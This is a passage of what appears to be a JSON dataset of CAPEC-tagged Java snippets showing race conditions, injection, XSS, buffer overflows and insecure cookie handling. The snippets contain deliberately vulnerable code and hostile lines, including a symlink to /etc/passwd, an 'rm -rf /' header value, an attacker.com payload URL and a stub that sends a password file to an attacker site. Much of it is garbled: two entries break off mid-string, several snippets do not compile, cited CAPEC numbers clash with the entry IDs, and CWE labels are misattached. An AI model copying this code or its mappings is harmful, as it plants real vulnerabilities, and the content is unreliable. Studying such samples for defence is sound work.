        "description": "This Java code snippet demonstrates a deadlock condition. Two threads, t1 and t2, are competing for locks on two objects, lock1 and lock2. Each thread acquires a lock, then waits for the other thread to release its lock, resulting in a deadlock. This code embodies CWE-412, CWE-567, CWE-662, CWE-667, CWE-833, and CWE-1322, as it lacks proper synchronization and locking mechanisms, leading to a denial of service."
    },
    {
        "capec_id": "26",
        "code_snippet": "public class RaceConditionExample {\n    private static boolean isFilePresent = false;\n    private static File file = new File(\"example.txt\");\n\n    public static void main(String[] args) {\n        Thread thread1 = new Thread(new Runnable() {\n            public void run() {\n                if (!isFilePresent) {\n                    try {\n                        Thread.sleep(100);\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n                    file.createNewFile();\n                    isFilePresent = true;\n                }\n            }\n        });\n\n        Thread thread2 = new Thread(new Runnable() {\n            public void run() {\n                if (isFilePresent) {\n                    try {\n                        Thread.sleep(50);\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n                    // Replace the original file with a malicious one\n                    File maliciousFile = new File(\"malicious.txt\");\n                    file.delete();\n                    maliciousFile.renameTo(file);\n                }\n            }\n        });\n\n        thread1.start();\n        thread2.start();\n    }\n}",
        "description": "This Java code snippet demonstrates a race condition vulnerability (CAPEC-369) by creating two threads that access and manipulate the same file concurrently. The first thread creates a new file if it doesn't exist, while the second thread replaces the original file with a malicious one if it exists. The race condition occurs because the threads are not properly synchronized, allowing the second thread to replace the file before the first thread has a chance to create it. This vulnerability can be exploited by an attacker to trick the system into reading the malicious file, which can lead to unauthorized access or data tampering. CWE-363, CWE-366, and CWE-362 are related to this vulnerability."
    },
    {
        "capec_id": "27",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class SymlinkRaceCondition {\n    public static void main(String[] args) {\n        String tempFile = \"/tmp/tempfile\";\n        String targetFile = \"/etc/passwd\";\n        String symlinkFile = \"/tmp/symlink\";\n\n        // CWE-61: UNIX Symbolic Link (Symlink) Following\n        new File(symlinkFile).delete();\n        Runtime.getRuntime().exec(new String[]{\"ln\", \"-s\", targetFile, symlinkFile});\n\n        try {\n            // CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition\n            if (!new File(tempFile).exists()) {\n                // CWE-689: Permission Race Condition During Resource Copy\n                new FileWriter(tempFile).write(\"malicious content\\n\");\n            }\n        } catch (IOException e) {\n            System.out.println(\"Error creating temp file\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a Symlink race condition attack. It creates a symbolic link to a sensitive file (/etc/passwd) and then tries to create a temporary file with the same name. If the check for the temporary file's existence and its creation are not atomic, an attacker can create the Symlink during this interval, allowing them to write malicious content to the sensitive file."
    },
    {
        "capec_id": "28",
        "code_snippet": "import java.util.Scanner;\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.sql.SQLException;\n\npublic class FuzzingExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter user input:\");\n        String userInput = scanner.nextLine();\n\n        // CWE-20: Improper Input Validation\n        // No validation is performed on the user input\n\n        String query = \"SELECT * FROM users WHERE name = '\" + userInput + \"'\";\n\n        try {\n            Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"root\", \"password\");\n            PreparedStatement pstmt = conn.prepareStatement(query);\n            pstmt.executeQuery();\n        } catch (SQLException e) {\n            // CWE-209: Generation of Error Message Containing Sensitive Information\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of fuzzing to identify weaknesses in the system. It takes user input without validation (CWE-20) and constructs a SQL query with the input, making it vulnerable to SQL injection (CWE-74). The code also generates an error message that includes sensitive information about the environment (CWE-209). An attacker can use fuzzing to discover the assumptions made about user input and craft malicious input to achieve their goals."
    },
    {
        "capec_id": "29",
        "code_snippet": "public class FileAccessRaceCondition {\n    public static void main(String[] args) {\n        String filePath = \"/path/to/file\";\n        if (checkFileAccess(filePath)) {\n            // TOCTOU race condition\n            // An attacker can replace or modify the file between the check and the use\n            useFile(filePath);\n        }\n    }\n\n    private static boolean checkFileAccess(String filePath) {\n        // CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition\n        // Checking the file access without proper synchronization\n        return new File(filePath).canRead();\n    }\n\n    private static void useFile(String filePath) {\n        // CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')\n        // Using the file without proper synchronization\n        try {\n            FileReader fileReader = new FileReader(filePath);\n            // CWE-691: Insufficient Control Flow Management\n            // The control flow can be modified in unexpected ways\n            while (fileReader.read() != -1) {\n                // CWE-663: Use of a Non-reentrant Function in a Concurrent Context\n                // Using a non-reentrant function in a concurrent context\n                someNonReentrantFunction();\n            }\n        } catch (Exception e) {\n            // CWE-665: Improper Initialization\n            // The resource is not properly initialized\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n\n    private static void someNonReentrantFunction() {\n        // CWE-662: Improper Synchronization\n        // The function is not properly synchronized\n        // CWE-366: Race Condition within a Thread\n        // The function can be accessed by multiple threads simultaneously\n        // CWE-368: Context Switching Race Condition\n        // The function can be modified or misrepresent the product's behavior during the switch\n        // CWE-370: Missing Check for Certificate Revocation after Initial Check\n        // The function does not check the revocation status of a certificate after its initial revocation check\n        System.out.println(\"Non-reentrant function called\");\n    }\n}",
        "description": "This Java code snippet demonstrates a file access race condition, which is a type of Time-of-check Time-of-use (TOCTOU) race condition. The code checks if a file can be accessed, and if so, uses the file. However, an attacker can replace or modify the file between the check and the use, causing the application to behave unexpectedly. The code also includes several other CWEs, such as improper synchronization, insufficient control flow management, and improper initialization, which can exacerbate the race condition."
    },
    {
        "capec_id": "30",
        "code_snippet": "import java.lang.Runtime;\nimport java.lang.Thread;\nimport java.lang.reflect.Field;\n\npublic class HijackThread {\n    public static void main(String[] args) throws Exception {\n        // CWE-270: Privilege Context Switching Error\n        Runtime.getRuntime().exec(\"cmd /c calc\");\n\n        // CWE-114: Process Control\n        Thread thread = new Thread(new Runnable() {\n            public void run() {\n                try {\n                    Runtime.getRuntime().exec(\"cmd /c whoami\");\n                } catch (Exception e) {}\n            }\n        });\n        thread.start();\n\n        // CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')\n        Field field = Thread.class.getDeclaredField(\"target\");\n        field.setAccessible(true);\n        Object target = field.get(thread);\n        Field field2 = target.getClass().getDeclaredField(\"cmd\");\n        field2.setAccessible(true);\n        field2.set(target, \"cmd /c net user\");\n\n        // CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n        String osCommand = \"cmd /c dir\";\n        Runtime.getRuntime().exec(osCommand);\n\n        // CWE-1421: Exposure of Sensitive Information in Shared Microarchitectural Structures during Transient Execution\n        // This CWE is related to hardware-level vulnerabilities and cannot be demonstrated in Java code.\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of hijacking a privileged thread of execution by injecting malicious code into a running process. It uses CWE-270 to switch privileges, CWE-114 to execute malicious commands, CWE-362 to manipulate thread memory, CWE-78 to inject malicious OS commands, and CWE-1421 is mentioned as it is related to hardware-level vulnerabilities and cannot be demonstrated in Java code."
    },
    {
        "capec_id": "31",
        "code_snippet": "public class VulnerableCookieHandler {\n    public void handleCookie(HttpServletRequest request, HttpServletResponse response) {\n        Cookie[] cookies = request.getCookies();\n        if (cookies != null) {\n            for (Cookie cookie : cookies) {\n                if (cookie.getName().equals(\"userSession\")) {\n                    String sessionID = cookie.getValue();\n                    // CWE-565: No validation or integrity checking of the session ID\n                    // CWE-315: Storing sensitive information in cleartext in a cookie\n                    // CWE-539: Using persistent cookies containing sensitive information\n                    // CWE-642: External control of critical state data\n                    if (sessionID != null) {\n                        // CWE-20: Improper input validation\n                        // CWE-472: External control of assumed-immutable web parameter\n                        // CWE-384: Session fixation\n                        // CWE-602: Client-side enforcement of server-side security\n                        // CWE-642: External control of critical state data\n                        authenticateUser(sessionID);\n                    }\n                }\n            }\n        }\n    }\n\n    private void authenticateUser(String sessionID) {\n        // CWE-311: Missing encryption of sensitive data\n        // CWE-113: Improper neutralization of CRLF sequences in HTTP headers\n        // CWE-302: Authentication bypass by assumed-immutable data\n        // CWE-20: Improper input validation\n        // CWE-642: External control of critical state data\n        // No encryption or secure storage of sensitive data\n        // Assume the user is authenticated\n        System.out.println(\"User authenticated with session ID: \" + sessionID);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable cookie handler that relies on unvalidated and unencrypted cookies to authenticate users. It embodies the main idea of the CAPEC, which involves accessing, intercepting, and modifying HTTP cookies to impersonate users or manipulate server-side operations."
    },
    {
        "capec_id": "32",
        "code_snippet": "import javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends javax.servlet.http.HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"userInput\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body><h1>Hello, \" + userInput + \"!</h1></body></html>\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable servlet that is susceptible to cross-site scripting (XSS) attacks. It receives user input from an HTTP GET request, and directly embeds it into the HTML response without proper validation or encoding, allowing an attacker to inject malicious script code."
    },
    {
        "capec_id": "33",
        "code_snippet": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestSmuggling {\n    public static void main(String[] args) throws IOException {\n        URL url = new URL(\"http://example.com\");\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n\n        // CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers\n        connection.setRequestProperty(\"Host\", \"example.com\\r\\nX-Forwarded-For: 127.0.0.1\");\n\n        // CWE-441: Unintended Proxy or Intermediary ('Confused Deputy')\n        connection.setRequestProperty(\"Proxy-Authorization\", \"Basic QWxhZGprak=\\r\\n\");\n\n        // CWE-352: Cross-Site Request Forgery (CSRF)\n        connection.setRequestProperty(\"Referer\", \"http://attacker.com\");\n\n        // CWE-918: Server-Side Request Forgery (SSRF)\n        connection.setRequestProperty(\"X-Forwarded-For\", \"127.0.0.1\");\n\n        connection.setRequestMethod(\"GET\");\n        connection.connect();\n\n        OutputStream outputStream = connection.getOutputStream();\n        outputStream.write(\"GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\".getBytes());\n        outputStream.flush();\n        outputStream.close();\n    }\n}",
        "description": "This Java code snippet demonstrates HTTP Request Smuggling (CAPEC-113) by exploiting inconsistencies in HTTP request parsing and interpretation. It uses various CWEs to create a malicious request that can be used to smuggle unauthorized requests to a backend server. The code sets malicious headers, including Host, Proxy-Authorization, Referer, and X-Forwarded-For, to bypass security controls and trick the server into processing the request."
    },
    {
        "capec_id": "34",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String userInput = req.getParameter(\"input\");\n        String response = \"<http_response>\" + userInput + \"</http_response>\";\n        resp.setStatus(200);\n        resp.addHeader(\"Content-Type\", \"text/xml\");\n        resp.addHeader(\"Set-Cookie\", \"session_id=\" + userInput);\n        resp.getWriter().write(response);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable HTTP servlet that is susceptible to HTTP response splitting and injection attacks. The servlet takes user input from the 'input' parameter and injects it into the HTTP response without proper sanitization, allowing an attacker to inject malicious content, including CRLF sequences, into the response. This can lead to HTTP response splitting, where an attacker can inject a malicious HTTP response that can be interpreted by the client as a legitimate response from the server."
    },
    {
        "capec_id": "35",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class VulnerableConfigReader {\n    public static void main(String[] args) {\n        try {\n            File configFile = new File(\\",
        "description": "This Java code snippet demonstrates a vulnerable configuration reader that is susceptible to code injection and privilege escalation attacks. It loads a configuration file and uses the loaded properties to construct a database query, which is then executed using the Runtime.getRuntime().exec() method. The code does not properly neutralize the input from the configuration file, allowing an attacker to inject malicious code or manipulate the database query. Additionally, the code runs with elevated privileges, violating the principle of least privilege. This code snippet embodies the main idea of the CAPEC, which involves exploiting a system's trust in configuration and resource files to execute malicious code or manipulate the target process."
    },
    {
        "capec_id": "36",
        "code_snippet": "public class AdminController {\n    public void deleteUser(String username) {\n        // No authentication or authorization checks\n        UserDAO.deleteUser(username);\n    }\n\n    public void createAdminUser(String username, String password) {\n        // No authentication or authorization checks\n        UserDAO.createAdminUser(username, password);\n    }\n\n    public void shutdownServer() {\n        // No authentication or authorization checks\n        ServerManager.shutdown();\n    }\n}\n\npublic class UserDAO {\n    public static void deleteUser(String username) {\n        // Direct access to database without authentication\n        Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"root\", \"password\");\n        Statement stmt = conn.createStatement();\n        stmt.executeUpdate(\"DELETE FROM users WHERE username = '\" + username + \"'\");\n    }\n\n    public static void createAdminUser(String username, String password) {\n        // Direct access to database without authentication\n        Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"root\", \"password\");\n        Statement stmt = conn.createStatement();\n        stmt.executeUpdate(\"INSERT INTO users (username, password, role) VALUES ('\" + username + \"', '\" + password + \"', 'admin')\");\n    }\n}\n\npublic class ServerManager {\n    public static void shutdown() {\n        // Direct access to system functionality without authentication\n        Runtime.getRuntime().exit(0);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of an adversary searching for and invoking interfaces or functionality that the target system designers did not intend to be publicly available. The code lacks authentication and authorization checks, allowing unauthorized access to critical functions such as deleting users, creating admin users, and shutting down the server. The code also uses low-level functionality that is not intended for public use, such as direct database access and system shutdown."
    },
    {
        "capec_id": "37",
        "code_snippet": "public class SensitiveDataExposure {\n    private String apiKey = \"my_secret_api_key\";\n    private String dbUsername = \"root\";\n    private String dbPassword = \"password\";\n\n    public void storeSensitiveDataInCleartext() {\n        // CWE-312: Cleartext Storage of Sensitive Information\n        String data = \"apiKey: \" + apiKey + \", dbUsername: \" + dbUsername + \", dbPassword: \" + dbPassword;\n        File file = new File(\"sensitive_data.txt\");\n        try (BufferedWriter writer = new BufferedWriter(new FileWriter(file))) {\n            writer.write(data);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void storeSensitiveDataInCookie() {\n        // CWE-315: Cleartext Storage of Sensitive Information in a Cookie\n        Cookie cookie = new Cookie(\"sensitive_data\", \"apiKey: \" + apiKey + \", dbUsername: \" + dbUsername + \", dbPassword: \" + dbPassword);\n        // Add cookie to response\n    }\n\n    public void storeSensitiveDataInRegistry() {\n        // CWE-314: Cleartext Storage in the Registry\n        String registryKey = \"HKEY_CURRENT_USER\\\\Software\\\\MyApp\";\n        try {\n            RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default);\n            key.CreateSubKey(registryKey);\n            key.SetValue(\"sensitive_data\", \"apiKey: \" + apiKey + \", dbUsername: \" + dbUsername + \", dbPassword: \" + dbPassword);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void reuseMemoryWithoutClearing() {\n        // CWE-226: Sensitive Information in Resource Not Removed Before Reuse\n        byte[] buffer = new byte[1024];\n        // Use buffer to store sensitive data\n        // ... \n        // Reuse buffer without clearing it\n        buffer = new byte[1024];\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of an attacker examining a target system to find sensitive data that has been embedded within it. The code stores sensitive information such as API keys, database usernames, and passwords in cleartext in various locations, including files, cookies, and the registry, without proper encryption or clearing. It also reuses memory without clearing sensitive information, making it vulnerable to attacks."
    },
    {
        "capec_id": "38",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.lang.reflect.Method;\n\npublic class Main {\n    public static void main(String[] args) throws Exception {\n        // CWE-73: External Control of File Name or Path\n        String userInput = System.getProperty(\"user.input\");\n        File file = new File(userInput);\n        if (file.exists()) {\n            // CWE-426: Untrusted Search Path\n            System.setProperty(\"java.library.path\", file.getParent());\n            // CWE-427: Uncontrolled Search Path Element\n            System.load(file.getAbsolutePath());\n        }\n\n        // CWE-555: J2EE Misconfiguration: Plaintext Password in Configuration File\n        String password = \"password\";\n        System.setProperty(\"db.password\", password);\n\n        // CWE-99: Improper Control of Resource Identifiers ('Resource Injection')\n        String resourceName = userInput;\n        Class<?> clazz = Class.forName(resourceName);\n        Method method = clazz.getMethod(\"execute\");\n        method.invoke(null);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC pattern of attack where an adversary loads a malicious resource into a program's standard path. The code uses untrusted user input to set the java.library.path, allowing an attacker to control the search path. It also loads a malicious library and invokes a method from it, demonstrating uncontrolled search path elements and improper control of resource identifiers. Additionally, the code stores a plaintext password in a configuration file, which is a J2EE misconfiguration."
    },
    {
        "capec_id": "39",
        "code_snippet": "public class VulnerableApp {\n    private static final String COOKIE_NAME = \"user_data\";\n    private static final String COOKIE_SIGNATURE = \"signature\";\n\n    public static void handleRequest(HttpServletRequest request, HttpServletResponse response) {\n        Cookie[] cookies = request.getCookies();\n        String userData = null;\n        String signature = null;\n\n        for (Cookie cookie : cookies) {\n            if (cookie.getName().equals(COOKIE_NAME)) {\n                userData = cookie.getValue();\n            } else if (cookie.getName().equals(COOKIE_SIGNATURE)) {\n                signature = cookie.getValue();\n            }\n        }\n\n        if (userData != null && signature != null) {\n            // No integrity check, assume signature is valid\n            String[] userDataParts = userData.split(\":\");\n            String username = userDataParts[0];\n            String userRole = userDataParts[1];\n\n            // No authorization check, assume user is authorized\n            if (userRole.equals(\"admin\")) {\n                // Perform admin actions\n            } else {\n                // Perform user actions\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable application that stores sensitive user data in a cookie without proper integrity checks or authorization. The application assumes the cookie data is immutable and uses it to determine the user's role, allowing an attacker to manipulate the cookie and gain unauthorized access."
    },
    {
        "capec_id": "40",
        "code_snippet": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic class TerminalExploit {\n    public static void main(String[] args) {\n        try {\n            String userInput = System.console().readLine(\"Enter command: \");\n            Process process = Runtime.getRuntime().exec(userInput);\n            OutputStream outputStream = process.getOutputStream();\n            InputStream inputStream = process.getInputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = inputStream.read(buffer)) > 0) {\n                System.out.write(buffer, 0, bytesRead);\n            }\n            outputStream.close();\n            inputStream.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a terminal exploit that allows an attacker to inject malicious commands. The program reads user input and executes it as a command using Runtime.getRuntime().exec(), which is vulnerable to command injection (CWE-78). The input is not sanitized, allowing an attacker to inject malicious commands, such as copying sensitive files like /etc/passwd. The output of the command is then printed to the console, allowing the attacker to collect the results."
    },
    {
        "capec_id": "41",
        "code_snippet": "import java.util.Properties;\nimport javax.mail.Message;\nimport javax.mail.MessagingException;\nimport javax.mail.Session;\nimport javax.mail.Transport;\nimport javax.mail.internet.InternetAddress;\nimport javax.mail.internet.MimeMessage;\n\npublic class EmailHeaderInjection {\n    public static void main(String[] args) throws MessagingException {\n        Properties props = new Properties();\n        Session session = Session.getDefaultInstance(props, null);\n        MimeMessage message = new MimeMessage(session);\n        message.setFrom(new InternetAddress(\"attacker@example.com\"));\n        message.addRecipient(Message.RecipientType.TO, new InternetAddress(\"victim@example.com\"));\n        message.setSubject(\"Malicious Email\");\n\n        // CWE-150: Improper Neutralization of Escape, Meta, or Control Sequences\n        message.setHeader(\"X-Script\", \"<script>alert('XSS')</script>\");\n\n        // CWE-88: Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')\n        message.setHeader(\"X-Command\", \"system(\"rm -rf /\");\";\n\n        // CWE-697: Incorrect Comparison\n        if (message.getHeader(\"X-Script\").equals(\"<script>alert('XSS')</script>\")) {\n            System.out.println(\"Script injected successfully!\");\n        }\n\n        // CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax\n        message.setHeader(\"X-Flash\", \"<object><param name='movie' value='http://attacker.com/exploit.swf'></object>\");\n\n        // CWE-116: Improper Encoding or Escaping of Output\n        message.setContent(\"<html><body><h1>Malicious Email</h1></body></html>\", \"text/html; charset=UTF-8\");\n\n        Transport.send(message);\n    }\n}",
        "description": "This Java code snippet demonstrates an email header injection attack, which can lead to various security vulnerabilities, including XSS, command injection, and incorrect comparisons. The code sets malicious email headers using various CWEs, including CWE-150, CWE-88, CWE-697, CWE-644, and CWE-116, and sends the email using the JavaMail API."
    },
    {
        "capec_id": "42",
        "code_snippet": "import java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport javax.mail.MessagingException;\nimport javax.mail.internet.MimeMessage;\nimport javax.mail.internet.MimeMultipart;\n\npublic class VulnerableMimeConverter {\n    public static void convertToMime(InputStream inputStream) throws MessagingException, IOException {\n        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        while ((bytesRead = inputStream.read(buffer)) != -1) {\n            outputStream.write(buffer, 0, bytesRead);\n        }\n        String mimeContent = outputStream.toString();\n        MimeMessage message = new MimeMessage((Session) null, new ByteArrayInputStream(mimeContent.getBytes()));\n        MimeMultipart multipart = new MimeMultipart(message);\n        // No validation of input data\n        multipart.addBodyPart(new MimeBodyPart(inputStream));\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable MIME conversion routine that can lead to a buffer overflow and potentially allow an attacker to gain control over the mail server machine. The code reads input data from an InputStream without validating its size or content, and then writes it to a ByteArrayOutputStream without checking for buffer overflow. The input data is then used to construct a MimeMessage and MimeMultipart object without proper input validation, making it vulnerable to injection attacks. The code also relies on the file name or extension of the input file to determine its type, which can be exploited by attackers to cause the file to be misclassified and processed in a dangerous fashion."
    },
    {
        "capec_id": "43",
        "code_snippet": "public class VulnerableParser {\n    public String parseInput(String userInput) {\n        String validatedInput = validateInput(userInput);\n        String parsedInput = parseInputWithParser1(validatedInput);\n        parsedInput = parseInputWithParser2(parsedInput);\n        return parsedInput;\n    }\n\n    private String validateInput(String input) {\n        // CWE-20: Improper Input Validation\n        // CWE-183: Permissive List of Allowed Inputs\n        // CWE-184: Incomplete List of Disallowed Inputs\n        if (input.matches(\"^[a-zA-Z0-9]+$\")) {\n            return input;\n        } else {\n            throw new RuntimeException(\"Invalid input\");\n        }\n    }\n\n    private String parseInputWithParser1(String input) {\n        // CWE-179: Incorrect Behavior Order: Early Validation\n        // CWE-181: Incorrect Behavior Order: Validate Before Filter\n        return input.replace(\"\\\\\", \"\");\n    }\n\n    private String parseInputWithParser2(String input) {\n        // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component\n        // CWE-77: Improper Neutralization of Special Elements used in a Command\n        // CWE-78: Improper Neutralization of Special Elements used in an OS Command\n        return input.replace(\"'\", \"'\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC where an attacker can bypass input validation by providing input with layers of special characters. The code has multiple vulnerabilities, including improper input validation, incorrect behavior order, and improper neutralization of special elements. The input validation logic is too permissive, and the parsing layers do not properly neutralize special characters, allowing an attacker to inject malicious input."
    },
    {
        "capec_id": "44",
        "code_snippet": "public class VulnerableImageProcessor {\n    public void processImage(byte[] imageData) {\n        byte[] buffer = new byte[1024];\n        System.arraycopy(imageData, 0, buffer, 0, imageData.length);\n        // No check for buffer overflow\n        String fileType = get FileTypeFromExtension(new String(buffer));\n        if (fileType.equals(\"image/jpeg\")) {\n            // Process the image\n        }\n    }\n\n    private String get FileTypeFromExtension(String fileName) {\n        int lastIndex = fileName.lastIndexOf('.');\n        if (lastIndex != -1) {\n            String extension = fileName.substring(lastIndex);\n            if (extension.equals(\".jpg\") || extension.equals(\".jpeg\")) {\n                return \"image/jpeg\";\n            }\n        }\n        return \"unknown\";\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable image processor that is susceptible to a buffer overflow attack. The processImage method copies the input image data into a fixed-size buffer without checking the size of the input data, leading to a classic buffer overflow (CWE-120). The method also relies on the file extension to determine the file type (CWE-646), which can be easily manipulated by an attacker. Additionally, the code does not properly handle alternate data streams (CWE-69) and performs an incorrect comparison (CWE-697) when checking the file extension. An attacker can exploit these weaknesses to execute arbitrary code in the target process."
    },
    {
        "capec_id": "45",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\n\npublic class SymbolicLinkBufferOverflow {\n    public static void main(String[] args) throws IOException {\n        String symbolicLink = \"../path/to/symlink\";\n        String targetFile = \"target.txt\";\n        Path symlinkPath = Paths.get(symbolicLink);\n        Path targetPath = Paths.get(targetFile);\n\n        // CWE-285: Improper Authorization\n        if (System.getProperty(\"user.name\").equals(\"admin\")) {\n            // CWE-20: Improper Input Validation\n            if (args.length > 0) {\n                symbolicLink = args[0];\n            }\n\n            // CWE-118: Incorrect Access of Indexable Resource ('Range Error')\n            byte[] buffer = new byte[1024];\n            Files.readAllBytes(symlinkPath).get(0, buffer);\n\n            // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n            for (int i = 0; i < buffer.length; i++) {\n                buffer[i] = (byte) (buffer[i] + 1);\n            }\n\n            // CWE-680: Integer Overflow to Buffer Overflow\n            int bufferSize = Integer.MAX_VALUE - 1;\n            byte[] overflowBuffer = new byte[bufferSize];\n            System.arraycopy(buffer, 0, overflowBuffer, 0, buffer.length);\n\n            // CWE-697: Incorrect Comparison\n            if (bufferSize > buffer.length) {\n                System.out.println(\"Buffer overflow detected!\");\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a symbolic link-based buffer overflow attack. It creates a symbolic link to a target file and reads its contents into a buffer without proper size checking, leading to a buffer overflow. The code also includes improper authorization, input validation, and boundary checking, making it vulnerable to various attacks."
    },
    {
        "capec_id": "46",
        "code_snippet": "public class VulnerableConfigParser {\n    public static void parseConfig(String config) {\n        String[] keyValuePairs = config.split(\"=\",\n                Integer.MAX_VALUE);\n        for (String pair : keyValuePairs) {\n            String[] keyValuePair = pair.split(\" \", 2);\n            String key = keyValuePair[0];\n            String value = keyValuePair[1];\n            if (key.equals(\"bufferSize\")) {\n                int bufferSize = Integer.parseInt(value);\n                byte[] buffer = new byte[bufferSize];\n                // Vulnerable code: no input validation on 'value'\n                System.arraycopy(value.getBytes(), 0, buffer, 0, bufferSize);\n            }\n        }\n    }\n    public static void main(String[] args) {\n        parseConfig(\"bufferSize=1000 someMaliciousInput=\" + new String(new byte[10000]));\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable configuration parser that is susceptible to a buffer overflow attack. The parseConfig method splits the input configuration string into key-value pairs and then processes each pair. When it encounters a 'bufferSize' key, it creates a byte array of the specified size and copies the value into the array using System.arraycopy. However, it does not validate the size of the value, which can lead to a buffer overflow if the value is larger than the allocated buffer size. In the main method, an example malicious input is provided that can cause a buffer overflow."
    },
    {
        "capec_id": "47",
        "code_snippet": "public class VulnerableCode {\n    public static void processInput(byte[] input) {\n        byte[] output = new byte[1024];\n        System.arraycopy(input, 0, output, 0, input.length);\n        // No check for buffer overflow\n        System.out.println(new String(output));\n    }\n\n    public static void main(String[] args) {\n        byte[] userInput = new byte[2048];\n        for (int i = 0; i < 2048; i++) {\n            userInput[i] = (byte) (i % 256);\n        }\n        processInput(userInput);\n    }\n}",
        "description": "This Java code snippet demonstrates a classic buffer overflow vulnerability. The processInput method copies the input array to an output array without checking the size of the input array, leading to a buffer overflow. The main method creates a large input array and passes it to the processInput method, causing the buffer overflow."
    },
    {
        "capec_id": "48",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.net.URI;\nimport java.net.URISyntaxException;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        String userInput = \"file:///etc/passwd\";\n        try {\n            URI uri = new URI(userInput);\n            File file = new File(uri);\n            if (file.exists()) {\n                System.out.println(\"File exists: \" + file.getAbsolutePath());\n                // Send the file contents to an attacker-controlled site\n                sendFileContents(file);\n            }\n        } catch (URISyntaxException e) {\n            System.out.println(\"Invalid URI: \" + userInput);\n        }\n    }\n\n    private static void sendFileContents(File file) {\n        // TO DO: implement sending file contents to an attacker-controlled site\n        System.out.println(\"Sending file contents to attacker-controlled site...\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC attack by allowing user input to specify a local file path instead of a URL. The CWEs embodied in this code include CWE-241 (Improper Handling of Unexpected Data Type) by not validating the user input as a URL, CWE-706 (Use of Incorrectly-Resolved Name or Reference) by using the user-inputted file path to access a local file, CWE-598 (Use of GET Request Method With Sensitive Query Strings) by not using a secure method to send the file contents, CWE-84 (Improper Neutralization of Encoded URI Schemes in a Web Page) by not properly handling encoded URI schemes, and CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) by relying on the file name and extension to determine the file type."
    },
    {
        "capec_id": "49",
        "code_snippet": "public class BruteForceAttack {\n    private static final String[] COMMON_PASSWORDS = {\n        \\",
